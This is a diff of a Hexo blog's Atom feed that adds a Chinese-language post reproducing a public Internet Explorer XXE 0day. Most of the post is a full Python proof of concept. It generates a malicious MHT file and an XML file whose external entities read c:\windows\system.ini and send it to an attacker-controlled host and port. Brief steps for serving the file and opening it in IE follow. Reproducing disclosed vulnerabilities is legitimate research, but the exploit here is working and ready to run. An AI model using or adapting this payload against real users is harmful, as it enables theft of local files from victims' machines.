@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://my0tang.github.io/"/>
-  <updated>2019-04-12T07:41:04.751Z</updated>
+  <updated>2019-04-16T03:10:12.098Z</updated>
   <id>https://my0tang.github.io/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Internet Explorer XXE 漏洞复现</title>
+    <link href="https://my0tang.github.io/2019/04/16/Internet-Explorer-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://my0tang.github.io/2019/04/16/Internet-Explorer-XXE-漏洞复现/</id>
+    <published>2019-04-16T02:58:00.000Z</published>
+    <updated>2019-04-16T03:10:12.098Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="1-使用Python生成相应的文件"><a href="#1-使用Python生成相应的文件" class="headerlink" title="1.使用Python生成相应的文件"></a>1.使用Python生成相应的文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#Microsoft Internet Explorer XXE 0day</span><br><span class="line">#Creates malicious XXE .MHT and XML files</span><br><span class="line">#Open the MHT file in MSIE locally, should exfil system.ini</span><br><span class="line">#By hyp3rlinx </span><br><span class="line">#ApparitionSec</span><br><span class="line"></span><br><span class="line">ATTACKER_IP=&quot;localhost&quot;</span><br><span class="line">PORT=&quot;8000&quot;</span><br><span class="line"></span><br><span class="line">mht_file=(</span><br><span class="line">&apos;From:\n&apos;</span><br><span class="line">&apos;Subject:\n&apos;</span><br><span class="line">&apos;Date:\n&apos;</span><br><span class="line">&apos;MIME-Version: 1.0\n&apos;</span><br><span class="line">&apos;Content-Type: multipart/related; type=&quot;text/html&quot;;\n&apos;</span><br><span class="line">&apos;\tboundary=&quot;=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001&quot;\n&apos;</span><br><span class="line">&apos;This is a multi-part message in MIME format.\n\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n&apos;</span><br><span class="line">&apos;Content-Type: text/html; charset=&quot;UTF-8&quot;\n&apos;</span><br><span class="line">&apos;Content-Location: main.htm\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/transitional.dtd&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;html&gt;\n&apos;</span><br><span class="line">&apos;&lt;head&gt;\n&apos;</span><br><span class="line">&apos;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&apos;</span><br><span class="line">&apos;&lt;title&gt;MSIE XXE 0day&lt;/title&gt;\n&apos;</span><br><span class="line">&apos;&lt;/head&gt;\n&apos;</span><br><span class="line">&apos;&lt;body&gt;\n&apos;</span><br><span class="line">&apos;&lt;xml&gt;\n&apos;</span><br><span class="line">&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&apos;</span><br><span class="line">&apos;&lt;!DOCTYPE r [\n&apos;</span><br><span class="line">&apos;&lt;!ELEMENT r ANY &gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % sp SYSTEM &quot;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/datatears.xml&quot;&gt;\n&apos;</span><br><span class="line">&apos;%sp;\n&apos;</span><br><span class="line">&apos;%param1;\n&apos;</span><br><span class="line">&apos;]&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;/xml&gt;\n&apos;</span><br><span class="line">&apos;&lt;script&gt;window.print();&lt;/script&gt;\n&apos;</span><br><span class="line">&apos;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;tr&gt;\n&apos;</span><br><span class="line">&apos;&lt;td class=&quot;contentcell-width&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;h1&gt;MSIE XML External Entity 0day PoC.&lt;/h1&gt;\n&apos;</span><br><span class="line">&apos;&lt;h3&gt;Discovery: hyp3rlinx&lt;/h3&gt;\n&apos;</span><br><span class="line">&apos;&lt;h3&gt;ApparitionSec&lt;/h3&gt;\n&apos;</span><br><span class="line">&apos;&lt;/td&gt;\n&apos;</span><br><span class="line">&apos;&lt;/tr&gt;\n&apos;</span><br><span class="line">&apos;&lt;/table&gt;\n&apos;</span><br><span class="line">&apos;&lt;/body&gt;\n&apos;</span><br><span class="line">&apos;&lt;/html&gt;\n\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">xml_file=(</span><br><span class="line">&apos;&lt;!ENTITY % data SYSTEM &quot;c:\windows\system.ini&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM \&apos;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/?%data;\&apos;&gt;&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM \&apos;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/?%data;\&apos;&gt;&quot;&gt;\n&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def mk_msie_0day_filez(f,p):</span><br><span class="line">    f=open(f,&quot;wb&quot;)</span><br><span class="line">    f.write(p)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    mk_msie_0day_filez(&quot;msie-xxe-0day.mht&quot;,mht_file)</span><br><span class="line">    mk_msie_0day_filez(&quot;datatears.xml&quot;,xml_file)</span><br><span class="line">    print &quot;Microsoft Internet Explorer XML External Entity 0day PoC.&quot;</span><br><span class="line">    print &quot;Files msie-xxe-0day.mht and datatears.xml Created!.&quot;</span><br><span class="line">    print &quot;Discovery: Hyp3rlinx / Apparition Security&quot;</span><br></pre></td></tr></table></figure><p>以上脚本会在当前目录下生成两个文件，”msie-xxe-0day.mht”和”datatears.xml”<br><img src="/images/xxe/xxe1.jpg" alt></p><h1 id="2-启动Python服务器"><a href="#2-启动Python服务器" class="headerlink" title="2.启动Python服务器"></a>2.启动Python服务器</h1><p><code>python -m SimpleHTTPServer</code><br><img src="/images/xxe/xxe2.jpg" alt></p><h1 id="3-将生成的datatears-xml放在python服务器下面"><a href="#3-将生成的datatears-xml放在python服务器下面" class="headerlink" title="3.将生成的datatears.xml放在python服务器下面"></a>3.将生成的datatears.xml放在python服务器下面</h1><p><img src="/images/xxe/xxe3.jpg" alt></p><h1 id="4-打开生成的msie-xxe-0day-mht文件"><a href="#4-打开生成的msie-xxe-0day-mht文件" class="headerlink" title="4.打开生成的msie-xxe-0day.mht文件"></a>4.打开生成的msie-xxe-0day.mht文件</h1><p><img src="/images/xxe/xxe4.jpg" alt><br><img src="/images/xxe/xxe5.jpg" alt></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p><a href="https://www.anquanke.com/post/id/176647" target="_blank" rel="noopener">Internet Explorer XXE 漏洞预警</a></p><p><a href="http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt" target="_blank" rel="noopener">漏洞披露</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;1-使用Python生成相应的文件&quot;&gt;&lt;a href=&quot;#1-使用Python生成相应的文件&quot; class=&quot;headerlink&quot; title=&quot;1.使用Python生成相应的文件&quot;&gt;&lt;/a&gt;1.使用Python生成相应的文件&lt;/h1&gt;&lt;figure class
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="漏洞复现" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="漏洞复现" scheme="https://my0tang.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+      <category term="XXE" scheme="https://my0tang.github.io/tags/XXE/"/>
+    
+      <category term="渗透测试" scheme="https://my0tang.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>Python 简易端口扫描</title>
@@ -148,9 +179,9 @@
       <category term="渗透测试" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
-      <category term="信息收集" scheme="https://my0tang.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    
       <category term="渗透测试" scheme="https://my0tang.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="信息收集" scheme="https://my0tang.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     
   </entry>
   
